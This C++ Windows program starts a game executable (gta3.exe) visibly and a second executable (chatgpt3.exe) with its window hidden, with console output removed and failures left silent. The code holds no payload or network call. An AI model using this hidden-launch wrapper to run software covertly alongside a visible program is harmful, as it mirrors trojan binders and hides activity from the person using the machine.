#include <windows.h>

// Remove iostream usage to avoid any console-related output in a Windows app
// (Alternatively, you can use OutputDebugString for logging.)

void launchProcess(const wchar_t* path, bool hideWindow) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (hideWindow) {
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE; // Hide window
    }

    BOOL success = CreateProcessW(
        path,         // Application path
        NULL,         // Command line
        NULL,         // Process security attributes
        NULL,         // Primary thread security attributes
        FALSE,        // Handles not inheritable
        0,            // Creation flags
        NULL,         // Use parent's environment
        NULL,         // Use parent's starting directory 
        &si,          // Pointer to STARTUPINFO structure
        &pi           // Pointer to PROCESS_INFORMATION structure
    );

    if (success) {
        // Process launched successfully; close handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        // If needed, you can log errors using OutputDebugString
        // For example:
        // wchar_t errMsg[256];
        // wsprintf(errMsg, L"Failed to launch: %s (Error: %lu)\n", path, GetLastError());
        // OutputDebugStringW(errMsg);
    }
}

// Use WinMain as the entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Replace these with your actual executable paths
    const wchar_t* visibleExe = L"gta3.exe";    // Launch normally (visible)
    const wchar_t* hiddenExe = L"chatgpt3.exe";   // Launch hidden (background)

    // Launch processes
    launchProcess(visibleExe, false); // Visible
    launchProcess(hiddenExe, true);   // Hidden

    return 0;
}
